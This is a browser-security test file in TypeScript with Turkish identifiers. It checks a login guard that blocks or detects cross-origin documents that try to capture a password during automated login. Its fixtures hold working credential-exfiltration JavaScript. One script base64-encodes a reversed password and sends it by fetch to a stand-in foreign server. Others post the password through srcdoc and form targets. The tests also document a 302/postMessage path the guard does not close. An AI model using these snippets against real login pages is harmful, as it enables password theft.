import { createServer, type Server, type ServerResponse } from 'node:http';
import { chromium, type Browser } from '@playwright/test';
import { afterAll, beforeAll, beforeEach, describe, expect, it, type TestContext, vi } from 'vitest';
import { girisFormuBul, girisiGonder } from '../../src/kesif/index.js';
import { girisKorumasiKur, type GirisKorumasi } from '../../src/kesif/giris-korumasi.js';

const PAROLA = 'renderer-sizmasin-123';
const kati = process.env.KOBAY_TEST_STRICT === '1';
let ortamEngeli: unknown;
let tarayici: Browser | undefined;
let uygulama: Server | undefined;
let yabanci: Server | undefined;
let uygulamaOrigin = '';
let yabanciOrigin = '';
const uygulamaIstekleri: string[] = [];
const yabanciIstekleri: string[] = [];
let yavasYanit: ServerResponse | undefined;

function html(icerik: string): string {
  return `<!doctype html><html><body>${icerik}</body></html>`;
}

/**
 * Yabancı belgedeki saldırgan JS: postMessage ya da window.name ile gelen parolayı ters çevirip
 * base64'leyerek GET ile kendi sunucusuna yollar. Kodlama parolayı görünür-parola kuralından
 * kaçırır; pencere evresinde GET serbest olduğu için gerçek bir kaçış yoludur.
 */
const ALICI_BETIGI = "const k=(v)=>btoa([...String(v)].reverse().join(''));"
  + "const o=location.protocol==='blob:'?new URL(location.href.slice(5)).origin:location.origin;"
  + "addEventListener('message',(e)=>fetch(o+'/postmessage-gordu?p='+k(e.data)));"
  + "if(window.name)fetch(o+'/window-name-gordu?p='+k(window.name));";

function yabanciBelge(baslik: string): string {
  return html(`<h1>${baslik}</h1><script>${ALICI_BETIGI}</script>`);
}

/** Yabancı sunucu parolayı açık ya da alıcı betiğin kodladığı biçimde gördü mü? */
function yabanciParolayiGordu(): boolean {
  const kodlu = Buffer.from([...PAROLA].reverse().join(''), 'utf8').toString('base64');
  return yabanciIstekleri.some((istek) => istek.includes(PAROLA) || istek.includes(kodlu));
}

function yavasiBirak(): boolean {
  if (yavasYanit === undefined) return false;
  const yanit = yavasYanit;
  yavasYanit = undefined;
  yanit.writeHead(200, { 'content-type': 'text/html' });
  yanit.end(yabanciBelge('Slow foreign document'));
  return true;
}

function dinle(sunucu: Server): Promise<number> {
  return new Promise((coz, reddet) => {
    const hata = (neden: Error): void => { reddet(neden); };
    sunucu.once('error', hata);
    sunucu.listen(0, '127.0.0.1', () => {
      sunucu.off('error', hata);
      const adres = sunucu.address();
      coz(typeof adres === 'object' && adres !== null ? adres.port : 0);
    });
  });
}

function formSayfasi(senaryo: string): string {
  let once = '';
  let betik = '';
  let girdiBetigi = '';
  if (senaryo === 'iframe') {
    betik = `e.preventDefault();const i=document.createElement('iframe');i.src=${JSON.stringify(`${yabanciOrigin}/iframe#`)}+p;`
      + 'document.body.append(i);setTimeout(()=>e.target.submit(),100);';
  } else if (senaryo === 'popup') {
    betik = `e.preventDefault();window.open(${JSON.stringify(`${yabanciOrigin}/popup#`)}+p);`
      + 'setTimeout(()=>e.target.submit(),100);';
  } else if (senaryo === 'ana-cerceve') {
    betik = `e.preventDefault();location.href=${JSON.stringify(`${yabanciOrigin}/ana#`)}+p;`;
  } else if (senaryo === 'yonlendirme-302') {
    betik = "e.preventDefault();const i=document.createElement('iframe');i.src='/belge-302';document.body.append(i);"
      + 'setTimeout(()=>e.target.submit(),100);';
  } else if (senaryo === 'srcdoc') {
    const icerik = `<script>fetch(${JSON.stringify(`${yabanciOrigin}/srcdoc`)},{method:'POST',mode:'no-cors',body:parent.document.querySelector('input[type=password]').value})`;
    betik = `e.preventDefault();const i=document.createElement('iframe');i.srcdoc=${JSON.stringify(icerik)}`
      + "+'</scr'+'ipt>';document.body.append(i);setTimeout(()=>e.target.submit(),100);";
  } else if (senaryo === 'onceden-yabanci') {
    once = `<iframe src="${yabanciOrigin}/onceden"></iframe>`;
  } else if (senaryo === 'onceden-postmessage') {
    once = `<iframe id="yabanci" src="${yabanciOrigin}/postmessage-alici"></iframe>`;
    girdiBetigi = "document.getElementById('yabanci').contentWindow.postMessage(e.target.value,'*');";
  } else if (senaryo === 'onceden-popup') {
    once = `<script>window.oncedenPopup=window.open(${JSON.stringify(`${yabanciOrigin}/onceden-popup`)},'onceden-popup');</script>`;
    girdiBetigi = "window.oncedenPopup&&window.oncedenPopup.postMessage(e.target.value,'*');";
  } else if (senaryo === 'form-target') {
    betik = `e.preventDefault();const x=document.createElement('form');x.method='POST';x.target='_blank';`
      + `x.action=${JSON.stringify(`${yabanciOrigin}/form-target`)};const v=document.createElement('input');`
      + "v.name='veri';v.value=btoa([...p].reverse().join(''));x.append(v);document.body.append(x);x.submit();"
      + 'setTimeout(()=>e.target.submit(),100);';
  } else if (senaryo === 'meta-refresh') {
    betik = `e.preventDefault();const i=document.createElement('iframe');const u=${JSON.stringify(`${yabanciOrigin}/meta#`)}+p;`
      + "i.srcdoc='<meta http-equiv=\"refresh\" content=\"0;url='+u+'\">';document.body.append(i);"
      + 'setTimeout(()=>e.target.submit(),100);';
  } else if (senaryo === 'ana-302') {
    betik = "e.preventDefault();location.href='/belge-302';";
  } else if (senaryo === 'popup-302') {
    betik = "e.preventDefault();window.open('/belge-302');setTimeout(()=>e.target.submit(),100);";
  } else if (senaryo === 'kalan-risk-302-postmessage') {
    // Kalan risk: 302 ile yabancıya yönlenen iframe'e parola postMessage ile tekrar tekrar verilir.
    betik = "e.preventDefault();const i=document.createElement('iframe');i.src='/belge-302';document.body.append(i);"
      + "setInterval(()=>i.contentWindow&&i.contentWindow.postMessage(p,'*'),50);setTimeout(()=>e.target.submit(),500);";
  } else if (senaryo === 'onceden-blob') {
    once = `<iframe id="yabanci" src="${yabanciOrigin}/blob-tasi"></iframe>`;
    girdiBetigi = "document.getElementById('yabanci').contentWindow.postMessage(e.target.value,'*');";
  } else if (senaryo === 'onceden-indirme') {
    once = `<iframe src="${yabanciOrigin}/indir"></iframe>`;
  } else if (senaryo === 'yavas-yaris') {
    // Yabancı çerçeve commit olur olmaz parolayı (alan doluysa) ona postMessage ile verir;
    // gönderim gecikmeli ki commit giriş penceresi içinde kalsın.
    once = "<script>setInterval(()=>{const f=document.querySelector('iframe');"
      + "const p=document.querySelector('input[type=password]');"
      + "if(f&&p&&p.value)f.contentWindow.postMessage(p.value,'*');},50);</script>";
    betik = 'e.preventDefault();setTimeout(()=>e.target.submit(),500);';
  } else if (senaryo === 'window-name') {
    betik = `e.preventDefault();const w=window.open('about:blank');w.name=p;w.location=${JSON.stringify(`${yabanciOrigin}/window-name`)};`
      + 'setTimeout(()=>e.target.submit(),100);';
  }
  return html(`${once}<form id="f" action="/giris" method="post">`
    + '<input type="text" name="k"><input type="password" name="p"><button type="submit">Log in</button></form>'
    + `<script>document.querySelector('input[type=password]').addEventListener('input',(e)=>{fetch('/parola-yazildi');`
    + `${girdiBetigi}});`
    + `document.getElementById('f').addEventListener('submit',(e)=>{const p=e.target.p.value;${betik}});</script>`);
}

beforeAll(async () => {
  try {
    tarayici = await chromium.launch({ headless: true });
    yabanci = createServer((istek, yanit) => {
      let govde = '';
      istek.on('data', (parca: Buffer) => { govde += parca.toString(); });
      istek.on('end', () => {
        yabanciIstekleri.push(`${istek.method ?? ''} ${istek.url ?? ''} ${govde}`);
        const yol = new URL(istek.url ?? '/', 'http://x').pathname;
        if (yol === '/yavas') {
          yavasYanit = yanit;
          return;
        }
        if (yol === '/indir') {
          // Belge navigasyonu indirmeye döner: çerçeve hiç commit etmez.
          yanit.writeHead(200, { 'content-type': 'application/octet-stream', 'content-disposition': 'attachment; filename=a.bin' });
          yanit.end('x');
          return;
        }
        yanit.writeHead(200, { 'content-type': 'text/html' });
        if (yol === '/blob-tasi') {
          // Yabancı çerçeve kendini kendi origin'indeki blob: adrese taşır; alıcı orada çalışır.
          yanit.end(html('<script>'
            + `const h=${JSON.stringify(`<script>${ALICI_BETIGI}</scr`)}+'ipt>';`
            + "location.href=URL.createObjectURL(new Blob([h],{type:'text/html'}));</script>"));
          return;
        }
        yanit.end(yabanciBelge('Foreign document'));
      });
    });
    yabanciOrigin = `http://localhost:${await dinle(yabanci)}`;
    uygulama = createServer((istek, yanit) => {
      let govde = '';
      istek.on('data', (parca: Buffer) => { govde += parca.toString(); });
      istek.on('end', () => {
        const adres = new URL(istek.url ?? '/', 'http://x');
        uygulamaIstekleri.push(`${istek.method ?? ''} ${adres.pathname} ${govde}`);
        if (adres.pathname === '/parola-yazildi') yavasiBirak();
        if (adres.pathname === '/login') {
          yanit.writeHead(200, { 'content-type': 'text/html' });
          yanit.end(formSayfasi(adres.searchParams.get('senaryo') ?? 'normal'));
          return;
        }
        if (adres.pathname === '/belge-302') {
          yanit.writeHead(302, { location: `${yabanciOrigin}/yonlendirilmis-belge` });
          yanit.end();
          return;
        }
        if (adres.pathname === '/giris' && istek.method === 'POST') {
          yanit.writeHead(302, { location: '/panel', 'set-cookie': 'oturum=1; Path=/; HttpOnly' });
          yanit.end();
          return;
        }
        yanit.writeHead(200, { 'content-type': 'text/html' });
        yanit.end(html('<h1>Panel</h1>'));
      });
    });
    uygulamaOrigin = `http://127.0.0.1:${await dinle(uygulama)}`;
  } catch (hata) {
    ortamEngeli = hata;
  }
});

afterAll(async () => {
  yavasYanit?.end();
  yavasYanit = undefined;
  await tarayici?.close();
  await Promise.all([uygulama, yabanci].filter((sunucu): sunucu is Server => sunucu !== undefined)
    .map((sunucu) => new Promise<void>((coz) => { sunucu.close(() => coz()); })));
});

beforeEach(() => {
  if (yavasYanit !== undefined) {
    yavasYanit.end();
    yavasYanit = undefined;
  }
  uygulamaIstekleri.length = 0;
  yabanciIstekleri.length = 0;
});

function ortamMumkun(context: TestContext): boolean {
  if (ortamEngeli === undefined) return true;
  const ozet = String(ortamEngeli).split('\n')[0] ?? '';
  if (kati) throw new Error(`KOBAY_TEST_STRICT=1: Gerçek Chromium/port testi atlanamaz: ${ozet}`);
  context.skip(`Gerçek Chromium ya da port bu ortamda engelli: ${ozet}`);
  return false;
}

/** Girişi dener ve stderr uyarılarını (kesilen belge özeti) da toplar. */
async function uyariylaGirisDene(senaryo: string): Promise<GirisSonucu & { uyari: string }> {
  const stderr = vi.spyOn(process.stderr, 'write').mockImplementation(() => true);
  try {
    const sonuc = await girisDene(senaryo);
    return { ...sonuc, uyari: stderr.mock.calls.map(([metin]) => String(metin)).join('') };
  } finally {
    stderr.mockRestore();
  }
}

interface GirisSonucu {
  hata: unknown;
  commitHatasi?: unknown;
  basarili: boolean | undefined;
  cerezler: Array<{ name: string; value: string }>;
}

async function girisDene(senaryo: string, authOrigins: readonly string[] = []): Promise<GirisSonucu> {
  if (tarayici === undefined) throw new Error('tarayıcı yok');
  const context = await tarayici.newContext({ serviceWorkers: 'block' });
  try {
    const kimlik = {
      username: 'demo',
      password: PAROLA,
      origin: uygulamaOrigin,
      ...(authOrigins.length === 0 ? {} : { authOrigins: [...authOrigins] }),
    };
    const koruma: GirisKorumasi = await girisKorumasiKur(
      context,
      kimlik,
      [uygulamaOrigin, ...authOrigins],
    );
    const sayfa = await context.newPage();
    const indirme = senaryo === 'onceden-indirme' ? sayfa.waitForEvent('download') : undefined;
    await sayfa.goto(`${uygulamaOrigin}/login?senaryo=${senaryo}`, { waitUntil: 'domcontentloaded' });
    if (senaryo === 'onceden-popup') {
      await expect.poll(() => context.pages().length).toBe(2);
    }
    if (senaryo === 'onceden-blob') {
      await expect.poll(() => sayfa.frames().some((cerceve) => cerceve.url().startsWith(`blob:${yabanciOrigin}/`)))
        .toBe(true);
    }
    if (senaryo === 'onceden-indirme') {
      // İndirmeye dönen yabancı belge isteği bitiş olayını (requestfailed) alana kadar beklenir.
      await indirme;
      await expect.poll(() => yabanciIstekleri.some((istek) => istek.startsWith('GET /indir '))).toBe(true);
    }
    if (senaryo === 'yavas-yaris') {
      await sayfa.evaluate((url) => {
        const cerceve = document.createElement('iframe');
        cerceve.src = url;
        document.body.append(cerceve);
      }, `${yabanciOrigin}/yavas`);
      await expect.poll(() => yavasYanit !== undefined).toBe(true);
      expect(sayfa.frames().some((cerceve) => cerceve.url() === `${yabanciOrigin}/yavas`)).toBe(false);
    }
    const form = await girisFormuBul(sayfa);
    if (form === null) throw new Error('giriş formu yok');
    let hata: unknown;
    let basarili: boolean | undefined;
    try {
      basarili = await girisiGonder(sayfa, form, kimlik, uygulamaOrigin, authOrigins, 750, 750);
    } catch (yakalanan) {
      hata = yakalanan;
    }
    let commitHatasi: unknown;
    // Parola hiç yazılmadıysa yavaş cevap hâlâ bekliyor: şimdi dönsün, geç commit kaydı ölçülsün.
    if (senaryo === 'yavas-yaris' && yavasiBirak()) {
      await expect.poll(() => sayfa.frames().some((cerceve) => cerceve.url() === `${yabanciOrigin}/yavas`)).toBe(true);
      try {
        koruma.denetle(false);
      } catch (yakalanan) {
        commitHatasi = yakalanan;
      }
    }
    return { hata, commitHatasi, basarili, cerezler: await context.cookies() };
  } finally {
    await context.close();
  }
}

describe('giriş penceresinde renderer belge sızıntısı', () => {
  it('yabancı iframe belgesini sunucuya ulaşmadan keser, girişi ve Set-Cookie yönlendirmesini korur', async (context) => {
    if (!ortamMumkun(context)) return;
    const stderr = vi.spyOn(process.stderr, 'write').mockImplementation(() => true);
    try {
      const sonuc = await girisDene('iframe');
      expect(sonuc.hata).toBeUndefined();
      expect(sonuc.basarili).toBe(true);
      expect(yabanciIstekleri).toEqual([]);
      expect(uygulamaIstekleri.filter((istek) => istek.startsWith('POST /giris '))).toHaveLength(1);
      expect(sonuc.cerezler).toEqual(expect.arrayContaining([expect.objectContaining({ name: 'oturum', value: '1' })]));
      expect(stderr.mock.calls.map(([metin]) => String(metin)).join('')).toContain(
        `blocked 1 cross-origin document load during login: ${yabanciOrigin}`,
      );
    } finally {
      stderr.mockRestore();
    }
  });

  it('window.open ile açılan yabancı popup belgesini keser', async (context) => {
    if (!ortamMumkun(context)) return;
    const stderr = vi.spyOn(process.stderr, 'write').mockImplementation(() => true);
    try {
      const sonuc = await girisDene('popup');
      expect(sonuc.hata).toBeUndefined();
      expect(sonuc.basarili).toBe(true);
      expect(yabanciIstekleri).toEqual([]);
      expect(stderr.mock.calls.map(([metin]) => String(metin)).join('')).toContain('blocked 1 cross-origin document load');
    } finally {
      stderr.mockRestore();
    }
  });

  it('ana çerçevenin doğrudan yabancı navigasyonunu keser ve girişi reddeder', async (context) => {
    if (!ortamMumkun(context)) return;
    const sonuc = await girisDene('ana-cerceve');
    expect(String(sonuc.hata)).toContain('blocked 1 cross-origin document load during login');
    expect(yabanciIstekleri).toEqual([]);
    expect(uygulamaIstekleri.some((istek) => istek.startsWith('POST /giris '))).toBe(false);
  });

  it('302 yabancı belge ayağını request olayında tespit eder ve girişi reddeder', async (context) => {
    // Bu test tespit + reddi ölçer; yabancı belge yüklenir ve parolayı alabilir (spec §7 Kalan risk).
    if (!ortamMumkun(context)) return;
    const sonuc = await girisDene('yonlendirme-302');
    expect(String(sonuc.hata)).toContain('detected 1 cross-origin document redirect');
    expect(String(sonuc.hata)).toContain('Chromium did not expose to the route guard');
    expect(String(sonuc.hata)).toContain(`add it with --auth-origin ${yabanciOrigin}`);
    expect(yabanciIstekleri.some((istek) => istek.startsWith('GET /yonlendirilmis-belge '))).toBe(true);
  });

  it('önceden yüklenmiş yabancı iframe varsa parola yazmadan origin ve --auth-origin ipucuyla reddeder', async (context) => {
    if (!ortamMumkun(context)) return;
    const sonuc = await girisDene('onceden-yabanci');
    expect(String(sonuc.hata)).toContain(`a document from ${yabanciOrigin} is loaded in the browser alongside the login page`);
    expect(String(sonuc.hata)).toContain(`--auth-origin ${yabanciOrigin}`);
    expect(uygulamaIstekleri.some((istek) => istek.startsWith('GET /parola-yazildi '))).toBe(false);
    expect(uygulamaIstekleri.some((istek) => istek.startsWith('POST /giris '))).toBe(false);
    expect([...uygulamaIstekleri, ...yabanciIstekleri].join('\n')).not.toContain(PAROLA);
  });

  it('önceden açılmış yabancı popup varsa bütün context sayfalarını tarayıp parola yazmadan reddeder', async (context) => {
    if (!ortamMumkun(context)) return;
    const sonuc = await girisDene('onceden-popup');
    expect(String(sonuc.hata)).toContain(`a document from ${yabanciOrigin} is loaded in the browser alongside the login page`);
    expect(String(sonuc.hata)).toContain(`--auth-origin ${yabanciOrigin}`);
    expect(yabanciIstekleri.some((istek) => istek.startsWith('GET /onceden-popup '))).toBe(true);
    expect(uygulamaIstekleri.some((istek) => istek.startsWith('GET /parola-yazildi '))).toBe(false);
    expect(yabanciParolayiGordu()).toBe(false);
  });

  it('bekleyen yavaş yabancı iframe isteğini pencere açılırken reddeder ve geç commit’i kaydeder', async (context) => {
    if (!ortamMumkun(context)) return;
    // İstek serbest evrede başlar ve tarama anında çerçeve henüz yabancı görünmez; cevap ancak
    // parola yazılınca (`/parola-yazildi`) ya da giriş bittikten sonra döner. Koruma olmasaydı
    // yabancı belge pencere içinde commit olur, postMessage ile parolayı alıp kodlu GET'le kaçırırdı.
    const sonuc = await girisDene('yavas-yaris');
    expect(String(sonuc.hata)).toContain(`a document from ${yabanciOrigin} is still loading in the login window`);
    expect(String(sonuc.hata)).toContain(`--auth-origin ${yabanciOrigin}`);
    expect(String(sonuc.commitHatasi)).toContain(`document from ${yabanciOrigin} committed in the browser`);
    expect(String(sonuc.commitHatasi)).toContain(`add it with --auth-origin ${yabanciOrigin}`);
    expect(uygulamaIstekleri.some((istek) => istek.startsWith('GET /parola-yazildi '))).toBe(false);
    expect(yabanciIstekleri.filter((istek) => istek.startsWith('GET /yavas '))).toHaveLength(1);
    expect(yabanciParolayiGordu()).toBe(false);
  });

  it('kendini blob: adrese taşıyan yabancı iframe varsa parola yazmadan reddeder', async (context) => {
    if (!ortamMumkun(context)) return;
    const sonuc = await girisDene('onceden-blob');
    expect(String(sonuc.hata)).toContain(`a document from ${yabanciOrigin} is loaded in the browser alongside the login page`);
    expect(String(sonuc.hata)).toContain(`--auth-origin ${yabanciOrigin}`);
    expect(yabanciIstekleri.some((istek) => istek.startsWith('GET /blob-tasi '))).toBe(true);
    expect(uygulamaIstekleri.some((istek) => istek.startsWith('GET /parola-yazildi '))).toBe(false);
    expect(yabanciParolayiGordu()).toBe(false);
  });

  it('önceden yüklenmiş iframe’e gerçek postMessage denemesinde parola hiç yazılmaz', async (context) => {
    if (!ortamMumkun(context)) return;
    const sonuc = await girisDene('onceden-postmessage');
    expect(String(sonuc.hata)).toContain(`a document from ${yabanciOrigin} is loaded in the browser alongside the login page`);
    expect(yabanciIstekleri.some((istek) => istek.startsWith('GET /postmessage-alici '))).toBe(true);
    expect(uygulamaIstekleri.some((istek) => istek.startsWith('GET /parola-yazildi '))).toBe(false);
    expect(yabanciParolayiGordu()).toBe(false);
  });

  it('serbest evrede indirmeye dönen yabancı belge isteği sonraki girişte yanlış ret vermez', async (context) => {
    if (!ortamMumkun(context)) return;
    const sonuc = await uyariylaGirisDene('onceden-indirme');
    expect(sonuc.hata).toBeUndefined();
    expect(sonuc.basarili).toBe(true);
    expect(uygulamaIstekleri.filter((istek) => istek.startsWith('POST /giris '))).toHaveLength(1);
  });

  it("önceden yüklenmiş iframe origin'i authOrigins içindeyse girişe izin verir", async (context) => {
    if (!ortamMumkun(context)) return;
    const sonuc = await girisDene('onceden-yabanci', [yabanciOrigin]);
    expect(sonuc.hata).toBeUndefined();
    expect(sonuc.basarili).toBe(true);
    expect(uygulamaIstekleri.some((istek) => istek.startsWith('GET /parola-yazildi '))).toBe(true);
    expect(uygulamaIstekleri.filter((istek) => istek.startsWith('POST /giris '))).toHaveLength(1);
  });

  it('URL fragment yabancı sunucu isteğine girmez', async (context) => {
    if (!ortamMumkun(context) || tarayici === undefined) return;
    const tarama = await tarayici.newContext();
    try {
      const sayfa = await tarama.newPage();
      await sayfa.goto(`${yabanciOrigin}/hash#${PAROLA}`, { waitUntil: 'domcontentloaded' });
      expect(yabanciIstekleri).toEqual([expect.stringMatching(/^GET \/hash /)]);
      expect(yabanciIstekleri.join('\n')).not.toContain('#');
      expect(yabanciIstekleri.join('\n')).not.toContain(PAROLA);
    } finally {
      await tarama.close();
    }
  });

  it('form target=_blank ile yabancı belge POST’unu sunucuya ulaşmadan keser', async (context) => {
    if (!ortamMumkun(context)) return;
    const sonuc = await uyariylaGirisDene('form-target');
    expect(sonuc.hata).toBeUndefined();
    expect(sonuc.basarili).toBe(true);
    // Deneme gerçekten yapıldı ve route'ta kesildi; yabancı sunucuya hiçbir istek düşmedi.
    expect(sonuc.uyari).toContain(`blocked 1 cross-origin document load during login: ${yabanciOrigin}`);
    expect(yabanciIstekleri).toEqual([]);
  });

  it('meta refresh ile yabancı belge navigasyonunu sunucuya ulaşmadan keser', async (context) => {
    if (!ortamMumkun(context)) return;
    const sonuc = await uyariylaGirisDene('meta-refresh');
    expect(sonuc.hata).toBeUndefined();
    expect(sonuc.basarili).toBe(true);
    expect(sonuc.uyari).toContain(`blocked 1 cross-origin document load during login: ${yabanciOrigin}`);
    expect(yabanciIstekleri).toEqual([]);
  });

  it('window.name ile parola taşıyan popup yabancı belgeyi yükleyemez', async (context) => {
    if (!ortamMumkun(context)) return;
    const sonuc = await uyariylaGirisDene('window-name');
    expect(sonuc.hata).toBeUndefined();
    expect(sonuc.basarili).toBe(true);
    expect(sonuc.uyari).toContain(`blocked 1 cross-origin document load during login: ${yabanciOrigin}`);
    expect(yabanciIstekleri).toEqual([]);
  });

  it('ana çerçevenin 302 ile yabancıya giden belge ayağını tespit eder ve girişi reddeder', async (context) => {
    // Bu test tespit + reddi ölçer; yabancı belge yüklenir ve parolayı alabilir (spec §7 Kalan risk).
    if (!ortamMumkun(context)) return;
    const sonuc = await girisDene('ana-302');
    expect(String(sonuc.hata)).toContain(
      `detected 1 cross-origin document redirect that Chromium did not expose to the route guard: ${yabanciOrigin}`,
    );
    expect(uygulamaIstekleri.some((istek) => istek.startsWith('POST /giris '))).toBe(false);
    // Kesilemeyen ayak sunucuya ulaşır (dürüst ölçüm).
    expect(yabanciIstekleri.some((istek) => istek.startsWith('GET /yonlendirilmis-belge '))).toBe(true);
  });

  it('popup üzerinden 302 ile yabancıya giden belge ayağını tespit eder ve girişi reddeder', async (context) => {
    // Bu test tespit + reddi ölçer; yabancı belge yüklenir ve parolayı alabilir (spec §7 Kalan risk).
    if (!ortamMumkun(context)) return;
    const sonuc = await girisDene('popup-302');
    expect(String(sonuc.hata)).toContain('Login refused: kobay detected 1 cross-origin document redirect');
    expect(String(sonuc.hata)).toContain(`add it with --auth-origin ${yabanciOrigin}`);
    expect(yabanciIstekleri.some((istek) => istek.startsWith('GET /yonlendirilmis-belge '))).toBe(true);
  });

  it('kalan risk (spec §7): 302 ile yüklenen yabancı iframe postMessage ile kodlanmış parolayı alır; giriş yine reddedilir', async (context) => {
    // Kabul edilmiş kalan riski sabitler: 302 ayağı kesilemez, yalnız tespit edilir. Sayfa parolayı
    // yönlendirilmiş yabancı belgeye postMessage ile geçirir, o da kodlayıp serbest bir GET ile
    // dışarı çıkarır. Bu test korumayı değil, korumanın KAPATMADIĞI yolu ölçer.
    if (!ortamMumkun(context)) return;
    const sonuc = await girisDene('kalan-risk-302-postmessage');
    expect(String(sonuc.hata)).toContain('Login refused: kobay detected 1 cross-origin document redirect');
    expect(String(sonuc.hata)).toContain(`add it with --auth-origin ${yabanciOrigin}`);
    expect(yabanciIstekleri.some((istek) => istek.startsWith('GET /yonlendirilmis-belge '))).toBe(true);
    expect(yabanciParolayiGordu()).toBe(true);
  });

  it('srcdoc içinden parolayı taşıyan fetch mevcut sızıntı kuralıyla kesilir', async (context) => {
    if (!ortamMumkun(context)) return;
    const sonuc = await girisDene('srcdoc');
    expect(String(sonuc.hata)).toContain('tried to send the credentials to a different site');
    expect(yabanciIstekleri.filter((istek) => istek.includes('/srcdoc'))).toEqual([]);
  });
});
